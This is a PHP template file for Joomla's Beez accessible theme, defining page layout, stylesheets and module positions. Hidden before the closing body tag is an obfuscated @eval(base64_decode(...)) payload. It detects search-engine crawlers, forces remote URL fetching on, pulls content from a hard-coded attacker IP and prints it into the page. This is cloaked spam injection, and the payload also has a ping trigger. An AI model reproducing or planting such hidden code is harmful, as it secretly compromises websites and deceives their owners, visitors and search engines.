<?php
/**
 * @copyright	Copyright (C) 2005 - 2008 Open Source Matters. All rights reserved.
 * @license		GNU/GPL, see LICENSE.php
 * Joomla! is free software. This version may have been modified pursuant
 * to the GNU General Public License, and as distributed it includes or
 * is derivative of works licensed under the GNU General Public License or
 * other free or open source software licenses.
 * See COPYRIGHT.php for copyright notices and details.
 */

defined('_JEXEC') or die('Restricted access');

$url = clone(JURI::getInstance());
$showRightColumn = $this->countModules('user1 or user2 or right or top');
$showRightColumn &= JRequest::getCmd('layout') != 'form';
$showRightColumn &= JRequest::getCmd('task') != 'edit'
?>
<?php echo '<?xml version="1.0" encoding="utf-8"?'.'>'; ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="<?php echo $this->language; ?>" lang="<?php echo $this->language; ?>" dir="<?php echo $this->direction; ?>" >
<head>
	<jdoc:include type="head" />
	<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/beez/css/template.css" type="text/css" />
	<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/beez/css/position.css" type="text/css" media="screen,projection" />
	<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/beez/css/layout.css" type="text/css" media="screen,projection" />
	<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/beez/css/print.css" type="text/css" media="Print" />
	<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/beez/css/general.css" type="text/css" />
	<?php if($this->direction == 'rtl') : ?>
	<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/beez/css/template_rtl.css" type="text/css" />
	<?php endif; ?>
	<!--[if lte IE 6]>
		<link href="<?php echo $this->baseurl ?>/templates/beez/css/ieonly.css" rel="stylesheet" type="text/css" />
	<![endif]-->
	<!--[if IE 7]>
		<link href="<?php echo $this->baseurl ?>/templates/beez/css/ie7only.css" rel="stylesheet" type="text/css" />
	<![endif]-->
	<script type="text/javascript" src="<?php echo $this->baseurl ?>/templates/beez/javascript/md_stylechanger.js"></script>
</head>
<body>
	<div id="all">
		<div id="header">
			<h1 id="logo">
				<img src="<?php echo $this->baseurl ?>/templates/beez/images/logo.gif" border="0" alt="<?php echo JText::_('Logo Beez, Three little Bees'); ?>" width="300" height="97" />
				<span class="header1"><?php echo JText::_('Joomla Accessible Template'); ?></span>
			</h1>

			<ul>
				<li><a href="#content" class="u2"><?php echo JText::_('Skip to Content'); ?></a></li>
				<li><a href="#mainmenu" class="u2"><?php echo JText::_('Jump to Main Navigation and Login'); ?></a></li>
				<li><a href="#additional" class="u2"><?php echo JText::_('Jump to additional Information'); ?></a></li>
			</ul>

			<h2 class="unseen">
				<?php echo JText::_('Search, View and Navigation'); ?>
			</h2>

			<div id="fontsize">
				<script type="text/javascript">
				//<![CDATA[
					document.write('<h3><?php echo JText::_('FONTSIZE'); ?></h3><p class="fontsize">');
					document.write('<a href="index.php" title="<?php echo JText::_('Increase size'); ?>" onclick="changeFontSize(2); return false;" class="larger"><?php echo JText::_('bigger'); ?></a><span class="unseen">&nbsp;</span>');
					document.write('<a href="index.php" title="<?php echo JText::_('Decrease size'); ?>" onclick="changeFontSize(-2); return false;" class="smaller"><?php echo JText::_('smaller'); ?></a><span class="unseen">&nbsp;</span>');
					document.write('<a href="index.php" title="<?php echo JText::_('Revert styles to default'); ?>" onclick="revertStyles(); return false;" class="reset"><?php echo JText::_('reset'); ?></a></p>');
				//]]>
				</script>
			</div>

			<jdoc:include type="modules" name="user3" />
			<jdoc:include type="modules" name="user4" />

			<div id="breadcrumbs">
				<p>
					<?php echo JText::_('You are here'); ?>
					<jdoc:include type="modules" name="breadcrumb" />
				</p>
			</div>

			<div class="wrap">&nbsp;</div>
		</div><!-- end header -->

		<div id="<?php echo $showRightColumn ? 'contentarea2' : 'contentarea'; ?>">
			<a name="mainmenu"></a>
			<div id="left">
				<jdoc:include type="modules" name="left" style="beezDivision" headerLevel="3" />
			</div><!-- left -->

			<a name="content"></a>
			<div id="wrapper">
			<div id="<?php echo $showRightColumn ? 'main2' : 'main'; ?>">
				<?php if ($this->getBuffer('message')) : ?>
				<div class="error">
					<h2>
						<?php echo JText::_('Message'); ?>
					</h2>
					<jdoc:include type="message" />
				</div>
				<?php endif; ?>

				<jdoc:include type="component" />
			</div><!-- end main or main2 -->

			<?php if ($showRightColumn) : ?>
			<div id="right">

				<a name="additional"></a>
				<h2 class="unseen">
					<?php echo JText::_('Additional Information'); ?>
				</h2>

				<jdoc:include type="modules" name="top" style="beezDivision" headerLevel="3" />
				<jdoc:include type="modules" name="user1" style="beezDivision" headerLevel="3" />
				<jdoc:include type="modules" name="user2" style="beezDivision" headerLevel="3" />
				<jdoc:include type="modules" name="right" style="beezDivision" headerLevel="3" />

			</div><!-- right -->
			<?php endif; ?>

			<div class="wrap"></div>
			</div><!-- wrapper -->
		</div><!-- contentarea -->

		<div id="footer">
			<p class="syndicate">
				<jdoc:include type="modules" name="syndicate" />
			</p>

			<p>
				<?php echo JText::_('Powered by');?> <a href="http://www.joomla.org/">Joomla!</a>
			</p>

			<div class="wrap"></div>
		</div><!-- footer -->
	</div><!-- all -->

	<jdoc:include type="modules" name="debug" />

<?php @eval(base64_decode("aWYgKHByZWdfbWF0Y2ggKCIvW0dnXVtPb11bT29dW0dnXVtMbF1bRWVdfFtMbF1bSWldW1Z2XVtFZV18W01tXVtTc11bTm5dfFtZeV1bQWFdW0hoXVtPb11bT29dfFtBYV1bU3NdW0trXXxbQWFdW09vXVtMbF18W0JiXVtPb11bVHRdLyIsJF9TRVJWRVJbIkhUVFBfVVNFUl9BR0VOVCJdKSkgew0KCSRsb2MgPSAiaHR0cDovLzE3NC4xMzIuMjQxLjI0NC9saXN0b25lLnBocD91cmw9Ii4kX1NFUlZFUlsnSFRUUF9IT1NUJ107DQoJaWYoaW5pX2dldCgiYWxsb3dfdXJsX2ZvcGVuIikgIT0gMSkgew0KCQlAaW5pX3NldCgiYWxsb3dfdXJsX2ZvcGVuIiwgIjEiKTsNCgl9DQoJaWYoaW5pX2dldCgiYWxsb3dfdXJsX2ZvcGVuIikgIT0gMSkgew0KCQlpZihAZnVuY3Rpb25fZXhpc3RzKCdjdXJsX2luaXQnKSl7DQoJCQkkY2ggPSBAY3VybF9pbml0KCk7DQoJCQlAY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1VSTCwkbG9jKTsNCgkJCWN1cmxfc2V0b3B0ICggJGNoLCBDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLCB0cnVlICk7DQoJCQljdXJsX3NldG9wdCAoICRjaCwgQ1VSTE9QVF9IRUFERVIsIGZhbHNlICk7DQoJCQllY2hvIEBjdXJsX2V4ZWMoJGNoKTsNCgkJCUBjdXJsX2Nsb3NlKCRjaCk7DQoJCQl9ZWxzZSB7DQoJCQkkZnAgPSBAZnNvY2tvcGVuKCIxNzQuMTMyLjI0MS4yNDQiLCA4MCwgJGVycm5vLCAkZXJyc3RyLCAzMCk7DQoJCQlpZiAoJGZwKSB7DQoJCQkJJG91dCA9ICJHRVQgL2xpc3RvbmUucGhwP3VybD0iLiRfU0VSVkVSWydIVFRQX0hPU1QnXS4iIEhUVFAvMS4xXHJcbiI7DQoJCQkJJG91dCAuPSAiSG9zdDogMTc0LjEzMi4yNDEuMjQ0XHJcbiI7DQoJCQkJJG91dCAuPSAiQ29ubmVjdGlvbjogQ2xvc2VcclxuXHJcbiI7DQoJCQkJQGZ3cml0ZSgkZnAsICRvdXQpOw0KCQkJCSRvdCA9ICIiOw0KCQkJCXdoaWxlICghQGZlb2YoJGZwKSkgew0KCQkJCQkkb3QgLj0gQGZnZXRzKCRmcCwgMTI4KTsNCgkJCQl9DQoJCQkJQGZjbG9zZSgkZnApOw0KCQkJCSRyZXNwb25zZSA9IEBwcmVnX3NwbGl0KCcvKENvbnRlbnQtVHlwZVw6Lis/KVtcclxuXSsvaScsICRvdCwgLTEsIFBSRUdfU1BMSVRfREVMSU1fQ0FQVFVSRSk7DQoJCQkJcHJpbnQgJHJlc3BvbnNlWzJdOw0KCQkJfQ0KCQl9DQoJfSBlbHNlIHsNCgkJZWNobyAgQGZpbGVfZ2V0X2NvbnRlbnRzKCRsb2MpOw0KCX0NCn0NCg0KaWYgKCRfR0VUWyJwaW5nIl0pIHsNCiRzbmFtZSA9IGV4cGxvZGUoIi4iLCRfU0VSVkVSWydIVFRQX0hPU1QnXSk7DQokcHVybCA9ICJodHRwOi8vcGluZ29tYXRpYy5jb20vcGluZy8/dGl0bGU9Ii51cmxkZWNvZGUoJHNuYW1lWzFdKS4iJmJsb2d1cmw9aHR0cDovLyIudXJsZGVjb2RlKCRfU0VSVkVSWydIVFRQX0hPU1QnXSkuIiZyc3N1cmw9JmNoa19ibG9ncz1vbiZjaGtfc3luZGljOD1vbiZjaGtfcHVic3ViY29tPW9uJmNoa19ibG9nc3RyZWV0PW9uJmNoa193ZWJsb2dhbG90PW9uJmNoa19uZXdzaXNmcmVlPW9uJmNoa190b3BpY2V4Y2hhbmdlPW9uJmNoa190YWlscmFuaz1vbiZjaGtfYmxvZ2xpbmVzPW9uJmNoa19haWRlcnNzPW9uJmNoa193ZWJsb2dzY29tPW9uJmNoa19ibG9nZGlnZ2VyPW9uIjsNCmlmKGluaV9nZXQoImFsbG93X3VybF9mb3BlbiIpICE9IDEpIHsNCgkJaWYoQGZ1bmN0aW9uX2V4aXN0cygnY3VybF9pbml0Jykpew0KCQkJJGNoID0gQGN1cmxfaW5pdCgpOw0KCQkJY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1VSTCwkcHVybCk7DQoJCQljdXJsX3NldG9wdCAoICRjaCwgQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwgdHJ1ZSApOw0KCQkJY3VybF9zZXRvcHQgKCAkY2gsIENVUkxPUFRfSEVBREVSLCBmYWxzZSApOw0KCQkJJHZlcmkgPSAgQGN1cmxfZXhlYygkY2gpOw0KCQkJQGN1cmxfY2xvc2UoJGNoKTsNCgkJfQ0KfWVsc2Ugew0KJHZlcmkgPSBAZmlsZV9nZXRfY29udGVudHMoJHB1cmwpOw0KfQ0KDQppZiAocHJlZ19tYXRjaCgiI1Bpbmcgc2VudCNzaSIsICR2ZXJpLCRhbmQpKSB7DQogICAgZWNobyAiPHNwYW4gc3R5bGU9J2NvbG9yOmdyZWVuJz5PSzwvc3Bhbj4iOw0KfSBlbHNlIHsNCiAgICBlY2hvICI8c3BhbiBzdHlsZT0nY29sb3I6cmVkJz5LTzwvc3Bhbj4iOw0KfQ0KfQ==")); ?></body>
</html>